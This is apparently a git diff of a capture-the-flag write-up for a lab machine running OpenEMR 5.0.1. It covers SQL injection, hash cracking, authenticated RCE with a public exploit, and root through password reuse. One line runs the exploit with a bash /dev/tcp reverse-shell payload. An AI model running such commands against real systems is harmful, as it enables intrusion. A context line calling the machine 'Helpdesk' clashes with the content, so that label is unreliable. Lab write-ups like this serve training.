@@ -26,8 +26,10 @@ This blog post is a writeup of the Helpdesk machine from Proving grounds practic
 
 ### Summary
 ------------------
-- ManageEngine allows us to access with the default credentials.
-- Having a valid user, we are able to exploit CVE-2014-5301 and get a reverse shell as a privileged user.
+- OpenEMR 5.0.1 it's vulnerable to a sql injection that allows us to get a password hash.
+- Cracking this hash we can obtain the password and gain access to the web app.
+- OpenEMR it's also vulnerable to RCE authenticated. Using the obtained password we are able to exploit it.
+- Once inside the victim's machine we are able to reuse the same password to obtain root access.
 
 ### Detailed steps
 ------------------
@@ -56,9 +58,11 @@ This login page shows that we are in front of a `OpenEMR`
 
 In order to find out the OpenEMR version, I found a common OpenEMR directory named 'sql' which was present in this server.
 This directory stores sql files which are generated in the updates. Knowing this, we can deduce OpenEMR version (`5.0.1` in this case).
+
 ![webpage3](\assets\images\pg-practice-apex\80.JPG)
 
 Also this directory contains some more interesting files as database.sql. This file shows the structure of the OpenEMR database.
+
 ![webpage4](\assets\images\pg-practice-apex\89.JPG)
 
 ### Explotation
@@ -100,6 +104,7 @@ Knowing the type of hash I cracked it with hashcat:
 
 Now, having this password I was able to log in successfully to the web portal as admin user:
 ![access](\assets\images\pg-practice-apex\96.JPG)
+
 ![access2](\assets\images\pg-practice-apex\97.JPG)
 
 
@@ -111,6 +116,7 @@ Opening a netcat listener and executing this exploit with the following paramate
 python2 45161.py http://192.168.164.145/openemr -u admin -p thedoctor -c "bash -c 'bash -i >& /dev/tcp/192.168.164.145/5555 0>&1'"
 ```
 ![shell](\assets\images\pg-practice-apex\101.JPG)
+
 ![shell2](\assets\images\pg-practice-apex\102.JPG)
 
 Being www-data user I was able to find the user flag:
@@ -122,4 +128,5 @@ Being www-data user I was able to find the user flag:
 In order to elevate privileges I have been looking for a way for a while until I realised that I could use the previously obtained password again.
 Just typing su root and using "thedoctor" as password I was able to log in as root and find the root flag.
 ![root](\assets\images\pg-practice-apex\227.JPG)
+
 ![flag2](\assets\images\pg-practice-apex\228.JPG)
